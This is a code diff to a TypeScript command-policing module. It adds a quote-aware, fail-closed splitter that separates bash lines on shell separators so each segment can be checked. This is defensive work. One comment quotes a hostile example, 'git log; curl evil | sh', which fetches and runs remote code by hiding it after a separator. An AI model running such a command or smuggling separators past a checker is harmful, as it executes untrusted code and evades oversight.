@@ -279,6 +279,65 @@ type BashAnalysis = {
 const SHELL_SEPARATORS = /(?:\|\||&&|[;|&\n])+/;
 
 /**
+ * Constructs after which this file's idea of "inside quotes" can disagree with
+ * the shell's, so a separator could hide in what it takes for a string:
+ *   - `$'...'` allows `\'` inside single quotes;
+ *   - a heredoc body and a `#` comment may hold an unbalanced quote that is not
+ *     a quote at all;
+ *   - `${...}` has its own quoting rules.
+ * The shell would then run a command the splitter never saw, so any of these
+ * sends the whole line to the plain split, which can only produce more segments.
+ */
+const QUOTE_UNSAFE = /\$'|<<|\$\{|(?:^|\s)#/;
+
+/**
+ * Split on shell separators, except inside single or double quotes and after a
+ * backslash. `grep -n "a\|b"` holds a pattern, not a pipe. Fails closed: a
+ * line with an unterminated quote, or any construct in QUOTE_UNSAFE, falls back
+ * to splitting on every separator, as before.
+ */
+export function splitOnSeparators(line: string): string[] {
+	if (!/["'\\]/.test(line) || QUOTE_UNSAFE.test(line)) return line.split(SHELL_SEPARATORS);
+
+	const pieces: string[] = [];
+	let current = "";
+	let quote: '"' | "'" | undefined;
+	for (let i = 0; i < line.length; i += 1) {
+		const ch = line[i] as string;
+		if (quote === "'") {
+			current += ch;
+			if (ch === "'") quote = undefined;
+			continue;
+		}
+		if (ch === "\\") {
+			// An escaped character is literal, in double quotes and outside them.
+			current += ch + (line[i + 1] ?? "");
+			i += 1;
+			continue;
+		}
+		if (quote === '"') {
+			current += ch;
+			if (ch === '"') quote = undefined;
+			continue;
+		}
+		if (ch === '"' || ch === "'") {
+			quote = ch;
+			current += ch;
+			continue;
+		}
+		if (/[;|&\n]/.test(ch)) {
+			pieces.push(current);
+			current = "";
+			continue;
+		}
+		current += ch;
+	}
+	if (quote !== undefined) return line.split(SHELL_SEPARATORS);
+	pieces.push(current);
+	return pieces;
+}
+
+/**
  * Take a command line apart far enough to police it. A single pattern match
  * against the whole string is not enough: `git log*` would otherwise cover
  * `git log; curl evil | sh` and `git log > src/app.tsx`, so substitutions,
@@ -309,7 +368,7 @@ export function analyzeBashCommand(command: string): BashAnalysis {
 	// Strip the redirections so they do not look like arguments of a segment.
 	remainder = remainder.replace(/(?:^|\s)\d?>>?\s*("[^"]*"|'[^']*'|\S+)/g, " ");
 
-	for (const segment of remainder.split(SHELL_SEPARATORS)) {
+	for (const segment of splitOnSeparators(remainder)) {
 		const trimmed = segment.trim();
 		if (trimmed !== "") segments.push(trimmed);
 	}
